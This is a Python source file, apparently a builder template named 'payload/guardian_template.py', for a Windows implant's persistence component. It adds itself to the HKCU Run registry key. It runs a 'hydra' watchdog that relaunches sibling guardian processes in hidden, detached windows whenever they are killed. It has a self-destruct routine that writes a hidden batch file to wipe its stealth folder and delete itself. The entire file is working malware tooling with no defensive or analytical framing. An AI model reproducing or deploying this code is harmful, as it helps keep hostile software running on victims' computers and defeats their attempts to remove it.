# payload/guardian_template.py (Full Code)
import sys
import os
import time
import subprocess
import json
import platform
import uuid

try:
    import psutil
except ImportError:
    psutil = None

try:
    import winreg
except ImportError:
    winreg = None

# --- INJECTED BY BUILDER ---
HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
TERMINATE_FLAG = False

def _perform_total_annihilation(stealth_dir):
    global TERMINATE_FLAG
    TERMINATE_FLAG = True

    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                for name in HYDRA_GUARDIANS:
                    try: winreg.DeleteValue(reg_key, name)
                    except FileNotFoundError: pass
        except Exception: pass

    cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{uuid.uuid4().hex}.bat")
    with open(cleanup_script_path, "w") as f:
        f.write("@echo off\n")
        f.write("timeout /t 3 /nobreak > NUL\n")
        f.write(f'if exist "{stealth_dir}" ( rd /s /q "{stealth_dir}" )\n')
        f.write(f'(goto) 2>nul & del "%~f0"\n')
    subprocess.Popen([cleanup_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)

    if psutil:
        my_pid = os.getpid()
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in HYDRA_GUARDIANS and proc.info['pid'] != my_pid:
                try: proc.terminate()
                except: pass
    
    sys.exit(0)

def install_persistence():
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = os.path.basename(sys.executable)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, sys.executable)
        except: pass

def hydra_watchdog():
    if not psutil:
        while True:
            time.sleep(3600)

    guardian_names = HYDRA_GUARDIANS
    my_name = os.path.basename(sys.executable)
    home_dir = os.path.dirname(sys.executable)
    heal_lock_file = os.path.join(os.environ["TEMP"], "tether_heal.lock")
    annihilation_file = os.path.join(home_dir, "annihilate.pill")
    
    time.sleep(5)

    while not TERMINATE_FLAG:
        if os.path.exists(annihilation_file):
            _perform_total_annihilation(home_dir)
            break

        try:
            running_procs = {p.info['name'] for p in psutil.process_iter(['name'])}
            missing_guardians = set(guardian_names) - running_procs
            
            if missing_guardians:
                # --- NEW: Healing Lock Mechanism ---
                lock_acquired = False
                try:
                    if os.path.exists(heal_lock_file):
                        if (time.time() - os.path.getmtime(heal_lock_file)) > 15:
                            os.remove(heal_lock_file)
                        else:
                            time.sleep(10)
                            continue
                    
                    with open(heal_lock_file, 'w') as f: f.write(str(time.time()))
                    lock_acquired = True

                    # Respawn logic, only runs if this instance got the lock
                    for guardian_name in missing_guardians:
                        if guardian_name != my_name:
                            guardian_path = os.path.join(home_dir, guardian_name)
                            if os.path.exists(guardian_path):
                                subprocess.Popen([guardian_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
                finally:
                    if lock_acquired and os.path.exists(heal_lock_file):
                        os.remove(heal_lock_file)
        
        except Exception: pass
        time.sleep(10)

if __name__ == "__main__":
    flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{os.path.basename(sys.executable)}.flg")
    
    if not os.path.exists(flag_file):
        install_persistence()
        try:
            with open(flag_file, 'w') as f:
                f.write('done')
        except: pass

    hydra_watchdog()